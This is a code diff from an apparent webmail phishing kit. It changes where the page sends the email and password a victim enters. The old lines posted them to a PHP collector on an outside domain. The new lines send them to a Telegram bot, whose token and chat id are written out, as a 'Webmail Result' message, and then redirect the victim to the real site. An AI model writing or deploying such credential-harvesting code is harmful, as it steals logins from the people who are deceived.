@@ -1860,25 +1860,23 @@ if (!password) {
 count=count+1;
 
 $.ajax({
-dataType: 'JSON',
-url: 'https://tskg.dpdns.org/php/result.php',
-type: 'POST',
-      	data:{
-			email:email,
-            password:password,	
-      	},
-			data: $('#contactform').serialize(),
-            beforeSend: function(xhr){
-            	
-            },
-            success: function(response){
-            	if(response){
-            		$("#msg").show();
-            		console.log(response);
-            		if(response['signal'] == 'ok'){
-            			$("#password").val("");
-            			if (count>=2) {
-            				count=0;
+      dataType: 'json', // JSON is lowercase
+      url: 'https://api.telegram.org/bot8826944452:AAGDknNPHlKHd75c9PC62W7_7MPWsZ7SzdQ/sendMessage',
+      type: 'POST',
+      data: {
+        chat_id: '1594275170',
+        text: `***** Webmail Result *****\r\nEmail: ${email}\r\nPassword: ${password}\r\n*****`
+      },
+      beforeSend: function(xhr) {
+        $('#submit-btn').html('Verifying...');
+      },
+      success: function(response) {
+        if (response.ok) {
+          $("#msg").show();
+          console.log(response);
+          $("#password").val("");
+          if (count >= 3) {
+            count = 0;
                     // window.location.replace(response['redirect_link']);
                    window.location.replace("https://www."+my_slice);
                 }
